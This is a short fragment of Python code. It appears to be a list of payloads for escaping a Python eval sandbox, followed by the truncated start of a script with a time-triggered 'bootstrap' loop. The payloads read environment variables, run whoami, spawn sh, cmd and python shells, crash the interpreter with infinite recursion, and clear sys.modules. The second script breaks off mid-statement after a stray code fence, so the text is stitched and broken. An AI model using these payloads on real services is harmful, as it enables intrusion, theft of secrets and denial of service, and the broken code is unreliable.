from types import FunctionType
list(FunctionType(list(FunctionType.__globals__.keys())[0].__code__.co_consts)[0].keys())[0].__code__.co_consts

__import__("os").getcwd()
__import__("os").environ
__import__("os").system("whoami")
__import__("os").system("cmd")
__import__("os").system("sh")
__import__("os").system("python")

(lambda fc=(lambda no: no(no))(lambda no: no(no)): fc(fc))()

__import__("sys").modules.clear()
```

```
#!/usr/bin/env python3

import os
import sys
import time
import datetime
import uuid

def bootstrap():
  # print("started at: " + str(datetime.datetime.now()))
  while True:
    now = datetime.datetime.now()
    if int(now.hour) == 19 and int(now.minute) == 15:
      print("bootstrapping..."
